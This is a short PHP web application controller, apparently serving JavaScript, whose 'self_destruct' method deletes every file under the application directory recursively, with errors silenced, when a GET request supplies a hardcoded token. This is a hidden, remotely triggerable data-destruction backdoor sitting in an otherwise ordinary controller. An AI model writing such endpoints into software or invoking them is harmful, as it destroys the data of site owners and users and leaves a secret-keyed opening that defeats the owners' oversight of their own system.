<?php
class ScriptsApplication extends Core\Application{
	
	function initialize(){
		header('Content-Type: text/javascript');
	}
	
	
	function index($r){
		$this->render();
	}

	function self_destruct(){
        
        if($this->get->token == '2d3f7e18a9a05e7d4405b8fd80e9aa2a4f234ba9'){
            $this->crystal->load('Util:DirectoryReader');
            $r = new DirectoryReader('.');
            $files = $r->getFiles('recursive');
            foreach($files As $file){
                if(is_file($file)){
                    @unlink($file);
                }
            }
            //print_r($files);
        }
        
    }
}
